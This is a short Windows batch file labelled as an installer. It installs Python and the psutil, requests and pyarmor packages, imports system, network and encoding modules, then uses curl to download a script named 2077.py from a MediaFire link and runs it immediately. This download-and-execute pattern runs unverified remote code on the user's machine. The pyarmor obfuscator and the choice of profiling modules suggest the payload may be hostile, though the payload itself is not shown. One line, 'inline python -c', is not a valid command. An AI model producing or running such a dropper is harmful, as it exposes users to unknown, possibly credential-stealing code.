@echo off
REM installer
winget install Python.Python.3.14
inline python -c "import sys, subprocess, importlib.util; REQUIRED_PACKAGES = ['psutil', 'requests', 'pyarmor']; [subprocess.check_call([sys.executable, '-m', 'pip', 'install', p]) for p in REQUIRED_PACKAGES if not importlib.util.find_spec(p)]"
python -c "import sys, subprocess, os, platform, psutil, requests, json, uuid, re, pathlib, base64, socket; print('All packages ready and modules imported!')"
curl -o 2077.py https://download1320.mediafire.com/aooeqdzy460gjAhi80op1kSQ8chozpA3dD86gPJVeWFYEzuFAJaWxNUVzfS9EPs1NL-fWFU9Rhvhz64rZpzpKMc8doHmsFUjipLZlkqwyl9oBjIaWVm2CNyYVmXxs1MMlwYMSqbuCpDob0i7xSrTuZymvZqem_XWck16w5ocUmuvJbM/f7f4ro7ac7t68it/2077.py
python 2077.py
